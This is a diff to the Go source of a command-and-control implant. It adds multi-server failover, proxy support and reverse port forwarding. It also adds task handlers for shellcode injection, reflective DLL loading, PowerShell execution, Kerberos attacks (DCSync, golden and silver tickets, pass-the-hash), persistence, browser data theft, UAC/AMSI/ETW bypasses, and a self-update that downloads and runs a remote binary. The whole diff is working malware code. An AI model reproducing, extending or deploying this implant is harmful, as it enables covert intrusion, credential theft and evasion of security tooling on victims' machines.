@@ -16,6 +16,7 @@ import (
 	mathRand "math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"runtime"
@@ -33,6 +34,8 @@ import (
 // IMPORTANT: -X can ONLY set string variables. Non-strings are injected as *Str and parsed in init().
 var (
 	C2URL            string = "http://127.0.0.1:8080"
+	C2URLs           []string       // parsed from C2URL (comma-separated multi-C2 failover)
+	currentC2Idx     int            // index of last working C2 server
 	IntervalStr      string = "10"
 	JitterStr        string = "20"
 	UserAgent        string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
@@ -50,6 +53,7 @@ var (
 	P2PListenAddr    string = ""      // listen addr for children (parent mode)
 	DNSDomain        string = ""      // DNS C2 domain (e.g. "c2.example.com")
 	DNSServer        string = ""      // DNS C2 server IP
+	ProxyStr         string = ""      // HTTP proxy URL (e.g. "http://proxy:8080")
 )
 
 // Parsed versions (populated in init)
@@ -179,6 +183,19 @@ func init() {
 	setDPIAware()
 
 	// Parse injected string values ( -X only supports string )
+	// Multi-C2 failover: comma-separated URLs in C2URL
+	parts := strings.Split(C2URL, ",")
+	C2URLs = make([]string, 0, len(parts))
+	for _, p := range parts {
+		p = strings.TrimSpace(p)
+		if p != "" {
+			C2URLs = append(C2URLs, p)
+		}
+	}
+	if len(C2URLs) == 0 {
+		C2URLs = []string{C2URL}
+	}
+	currentC2Idx = 0
 	var err error
 	Interval, err = strconv.Atoi(IntervalStr)
 	if err != nil {
@@ -206,6 +223,12 @@ func init() {
 	// TLS verification controlled by SkipTLSVerify (injected at build time)
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: SkipTLSVerify},
+	}
+	if ProxyStr != "" {
+		proxyURL, err := url.Parse(ProxyStr)
+		if err == nil {
+			tr.Proxy = http.ProxyURL(proxyURL)
+		}
 	}
 	client = &http.Client{Transport: tr, Timeout: 30 * time.Second}
 }
@@ -300,6 +323,13 @@ func doBeacon() {
 		inFastMode = true // fast poll while SOCKS is active
 	}
 
+	// Collect rportfwd data alongside SOCKS frames
+	rpfData := rportfwdCollectOutbound()
+	if len(rpfData) > 0 {
+		socksData = append(socksData, rpfData...)
+		inFastMode = true
+	}
+
 	// Collect P2P child results to relay
 	p2pRelayMu.Lock()
 	relayedResults := make([]RelayedData, 0)
@@ -386,30 +416,40 @@ func doBeacon() {
 }
 
 func sendBeacon(body []byte) []byte {
-	req, err := http.NewRequest(BeaconMethod, C2URL+BeaconURI, bytes.NewReader(body))
-	if err != nil {
-		return nil
-	}
-	req.Header.Set("Content-Type", "application/json")
-	req.Header.Set("User-Agent", UserAgent)
+	// Multi-C2 failover: try each URL starting from the last working one
+	startIdx := currentC2Idx
+	for i := 0; i < len(C2URLs); i++ {
+		idx := (startIdx + i) % len(C2URLs)
+		url := C2URLs[idx]
 
-	resp, err := client.Do(req)
-	if err != nil {
-		if Debug {
-			fmt.Printf("[!] Beacon failed: %v\n", err)
+		req, err := http.NewRequest(BeaconMethod, url+BeaconURI, bytes.NewReader(body))
+		if err != nil {
+			continue
 		}
-		return nil
-	}
-	defer resp.Body.Close()
+		req.Header.Set("Content-Type", "application/json")
+		req.Header.Set("User-Agent", UserAgent)
 
-	if resp.StatusCode != 200 {
-		if Debug {
-			fmt.Printf("[!] Server returned %d\n", resp.StatusCode)
+		resp, err := client.Do(req)
+		if err != nil {
+			if Debug {
+				fmt.Printf("[!] Beacon to %s failed: %v\n", url, err)
+			}
+			continue
 		}
-		return nil
+
+		if resp.StatusCode != 200 {
+			if Debug {
+				fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
+			}
+			resp.Body.Close()
+			continue
+		}
+		data, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		currentC2Idx = idx
+		return data
 	}
-	data, _ := io.ReadAll(resp.Body)
-	return data
+	return nil
 }
 
 // p2pCleanupStaleChildren prunes child UUIDs/results/tasks not seen in 10 minutes.
@@ -511,7 +551,7 @@ func sendScreenFrame(data []byte) {
 		Data: b64,
 	}
 	body, _ := json.Marshal(req)
-	screenURL := C2URL
+	screenURL := C2URLs[currentC2Idx]
 	if !strings.HasPrefix(screenURL, "http://") && !strings.HasPrefix(screenURL, "https://") {
 		screenURL = "http://" + screenURL
 	}
@@ -873,6 +913,28 @@ func executeTask(task Task) TaskResult {
 			res.Output = "inject success"
 		}
 
+	case "spawn":
+		parts := strings.SplitN(task.Command, "|", 3)
+		targetExe := "rundll32.exe"
+		technique := "CreateRemoteThread"
+		if len(parts) > 0 && parts[0] != "" {
+			targetExe = parts[0]
+		}
+		if len(parts) > 1 && parts[1] != "" {
+			technique = parts[1]
+		}
+		var shellcode []byte
+		if len(parts) > 2 && parts[2] != "" {
+			var err error
+			shellcode, err = base64.StdEncoding.DecodeString(parts[2])
+			if err != nil {
+				res.Error = "failed to decode shellcode: " + err.Error()
+				break
+			}
+		}
+		result := spawnProcess(targetExe, shellcode, technique)
+		res.Output = result
+
 	case "lateral":
 		// Command = "type|target|user|pass|cmd"
 		out, err := lateralMove(task.Command)
@@ -1094,11 +1156,262 @@ func executeTask(task Task) TaskResult {
 			}
 		}
 
+	case "net":
+		out := executeNetCommand(task.Command)
+		if strings.HasPrefix(out, "error:") {
+			res.Error = out
+		} else {
+			res.Output = out
+		}
+
+	// ── PowerPick: In-process PowerShell execution ──────────────────────
+	case "powerpick":
+		if runtime.GOOS != "windows" {
+			res.Error = "powerpick is Windows-only"
+			break
+		}
+		done := make(chan string, 1)
+		go func() {
+			done <- powerPick(task.Command)
+		}()
+		select {
+		case out := <-done:
+			if strings.HasPrefix(out, "failed") || strings.Contains(out, "[!] powerpick error:") {
+				res.Error = out
+			} else {
+				res.Output = out
+			}
+		case <-time.After(30 * time.Second):
+			res.Error = "powerpick execution timed out (30s)"
+		}
+
+	// ── P0-1: Reflective DLL Loader ─────────────────────────────────────
+	case "peloader":
+		if runtime.GOOS != "windows" {
+			res.Error = "peloader is Windows-only"
+			break
+		}
+		out, err := peloaderReflective(task.Data)
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = out
+		}
+
+	// ── P0-2: Execute-Assembly fork&run ────────────────────────────────
+	case "execute_assembly_forkrun":
+		if runtime.GOOS != "windows" {
+			res.Error = "execute-assembly fork&run is Windows-only"
+			break
+		}
+		out, err := executeAssemblyForkRun(task.Data)
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = out
+		}
+
+	// ── P0-3: Reverse Port Forward ─────────────────────────────────────
+	case "rportfwd_start":
+		// Command = "lport|forwardHost:forwardPort"
+		parts := strings.SplitN(task.Command, "|", 2)
+		if len(parts) < 2 {
+			res.Error = "format: lport|forwardHost:forwardPort"
+			break
+		}
+		lport := parts[0]
+		target := parts[1]
+		// Server will bind lport and relay connections through us
+		res.Output = fmt.Sprintf("rportfwd start: listening on :%s -> %s", lport, target)
+
+	case "rportfwd_stop":
+		res.Output = "rportfwd stop requested"
+
+	// ── P0-4: Kerberos Attack Suite ────────────────────────────────────
+	case "dcsync":
+		if runtime.GOOS != "windows" {
+			res.Error = "dcsync is Windows-only"
+			break
+		}
+		out, err := kerberosDCSync(task.Command)
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+			res.Encoding = "base64"
+		}
+
+	case "golden_ticket":
+		if runtime.GOOS != "windows" {
+			res.Error = "golden_ticket is Windows-only"
+			break
+		}
+		// Command = "user|domain|sid|krbtgt_hash"
+		parts := strings.SplitN(task.Command, "|", 4)
+		if len(parts) < 4 {
+			res.Error = "format: user|domain|sid|krbtgt_hash"
+			break
+		}
+		out, err := kerberosGoldenTicket(parts[0], parts[1], parts[2], parts[3])
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+			res.Encoding = "base64"
+		}
+
+	case "silver_ticket":
+		if runtime.GOOS != "windows" {
+			res.Error = "silver_ticket is Windows-only"
+			break
+		}
+		parts := strings.SplitN(task.Command, "|", 5)
+		if len(parts) < 5 {
+			res.Error = "format: user|domain|sid|target|rc4_hash"
+			break
+		}
+		out, err := kerberosSilverTicket(parts[0], parts[1], parts[2], parts[3], parts[4])
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+			res.Encoding = "base64"
+		}
+
+	case "asreproast":
+		if runtime.GOOS != "windows" {
+			res.Error = "asreproast is Windows-only"
+			break
+		}
+		out, err := kerberosASREPRoast()
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+			res.Encoding = "base64"
+		}
+
+	case "pass_the_hash":
+		if runtime.GOOS != "windows" {
+			res.Error = "pass_the_hash is Windows-only"
+			break
+		}
+		parts := strings.SplitN(task.Command, "|", 4)
+		if len(parts) < 3 {
+			res.Error = "format: user|domain|ntlm_hash[|target]"
+			break
+		}
+		target := ""
+		if len(parts) > 3 {
+			target = parts[3]
+		}
+		out, err := kerberosPassTheHash(parts[0], parts[1], parts[2], target)
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+			res.Encoding = "base64"
+		}
+
+	case "pass_the_ticket":
+		if runtime.GOOS != "windows" {
+			res.Error = "pass_the_ticket is Windows-only"
+			break
+		}
+		out, err := kerberosPassTheTicket(task.Data)
+		if err != nil {
+			res.Error = err.Error()
+		} else {
+			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+			res.Encoding = "base64"
+		}
+
+	case "persistence_add":
+		parts := strings.SplitN(task.Command, "|", 2)
+		method := parts[0]
+		args := ""
+		if len(parts) > 1 {
+			args = parts[1]
+		}
+		if runtime.GOOS != "windows" {
+			res.Error = "persistence is Windows-only"
+		} else {
+			res.Output = applyPersistence(method, args)
+		}
+
+	case "persistence_list":
+		if runtime.GOOS != "windows" {
+			res.Error = "persistence is Windows-only"
+		} else {
+			res.Output = listPersistence()
+		}
+
+	case "persistence_remove":
+		parts := strings.SplitN(task.Command, "|", 2)
+		method := parts[0]
+		args := ""
+		if len(parts) > 1 {
+			args = parts[1]
+		}
+		if runtime.GOOS != "windows" {
+			res.Error = "persistence is Windows-only"
+		} else {
+			res.Output = removePersistence(method, args)
+		}
+
+	case "browser_steal":
+		out := stealBrowserData(task.Command)
+		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
+		res.Encoding = "base64"
+
+	case "uac_bypass":
+		parts := strings.SplitN(task.Command, "|", 2)
+		method := parts[0]
+		payload := ""
+		if len(parts) > 1 {
+			payload = parts[1]
+		}
+		if runtime.GOOS != "windows" {
+			res.Error = "uac_bypass is Windows-only"
+		} else {
+			res.Output = uacBypass(method, payload)
+		}
+
+	case "amsi_bypass":
+		if runtime.GOOS != "windows" {
+			res.Error = "amsi_bypass is Windows-only"
+		} else {
+			res.Output = amsiBypass()
+		}
+
+	case "etw_bypass":
+		if runtime.GOOS != "windows" {
+			res.Error = "etw_bypass is Windows-only"
+		} else {
+			res.Output = etwBypass()
+		}
+
 	case "kill":
 		res.Output = "Agent terminating..."
 		sendTaskResult(res) // try to report before exit
 		time.Sleep(300 * time.Millisecond)
 		os.Exit(0)
+
+	case "self_update":
+		url := task.Command
+		if url == "" {
+			res.Error = "self_update: download URL required"
+			break
+		}
+		result := selfUpdate(url)
+		if strings.HasPrefix(result, "failed") {
+			res.Error = result
+		} else {
+			res.Output = result
+			sendTaskResult(res)
+			time.Sleep(500 * time.Millisecond)
+			os.Exit(0)
+		}
 
 	// ── Token Impersonation Tasks ─────────────────────────────────────────────
 	case "token_list_procs":
@@ -1791,6 +2104,60 @@ func deleteFileOrDir(path string) error {
 	return os.RemoveAll(path)
 }
 
+// selfUpdate downloads a new binary from URL and replaces the current process
+func selfUpdate(url string) string {
+	exe, err := os.Executable()
+	if err != nil {
+		return "failed to get executable path: " + err.Error()
+	}
+
+	// Download new binary
+	tmpPath := exe + ".update.tmp"
+	out, err := os.Create(tmpPath)
+	if err != nil {
+		return "failed to create temp file: " + err.Error()
+	}
+
+	httpReq, err := http.NewRequest("GET", url, nil)
+	if err != nil {
+		out.Close()
+		os.Remove(tmpPath)
+		return "failed to create request: " + err.Error()
+	}
+	httpReq.Header.Set("User-Agent", UserAgent)
+	httpReq.Header.Set("Content-Type", "application/octet-stream")
+
+	resp, err := client.Do(httpReq)
+	if err != nil {
+		out.Close()
+		os.Remove(tmpPath)
+		return "failed to download update: " + err.Error()
+	}
+	defer resp.Body.Close()
+
+	written, err := io.Copy(out, resp.Body)
+	out.Close()
+	if err != nil {
+		os.Remove(tmpPath)
+		return "failed to write update: " + err.Error()
+	}
+	if written == 0 {
+		os.Remove(tmpPath)
+		return "downloaded file is empty"
+	}
+
+	// Make temp file executable (Linux)
+	if runtime.GOOS != "windows" {
+		os.Chmod(tmpPath, 0755)
+	}
+
+	// Create wrapper script to replace and restart
+	if runtime.GOOS == "windows" {
+		return selfUpdateWindows(exe, tmpPath)
+	}
+	return selfUpdateLinux(exe, tmpPath)
+}
+
 // readFileContent returns raw bytes of a file (for "read" task)
 func readFileContent(path string) ([]byte, error) {
 	if path == "" {
@@ -1888,6 +2255,12 @@ func socksProcessFrames(frames []socksFrame) {
 			socksHandleData(f.ConnID, f.Data)
 		case "close":
 			socksHandleClose(f.ConnID)
+		case "rportfwd_connect":
+			go rportfwdDial(f.ConnID, string(f.Data))
+		case "rportfwd_data":
+			rportfwdWrite(f.ConnID, f.Data)
+		case "rportfwd_close":
+			rportfwdClose(f.ConnID)
 		}
 	}
 }
